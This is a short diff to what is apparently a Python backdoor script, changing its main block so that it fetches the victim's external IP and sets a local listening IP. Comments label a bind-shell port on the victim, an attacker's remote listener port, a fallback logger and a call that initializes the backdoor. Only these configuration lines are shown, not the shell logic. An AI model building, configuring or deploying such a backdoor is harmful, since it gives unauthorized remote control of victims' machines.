@@ -138,10 +138,9 @@ def initialize():
     listener(sock)
 
 if __name__ == "__main__":
-    #vip = getVictimIp()     # Get external IP address for victim
-    vip = '127.0.0.1'
+    vip = getVictimIp()     # Get external IP address for victim
     vport = 4444            # The port that the shell will bind to
     rport = 3000            # Remote listener port used by attacker
-    rip = ''       # Listening IP
+    rip = '127.0.0.1'       # Listening IP
     logurl = 'localhost'    # Url used by fallback logger
     initialize()            # Initialize backdoor
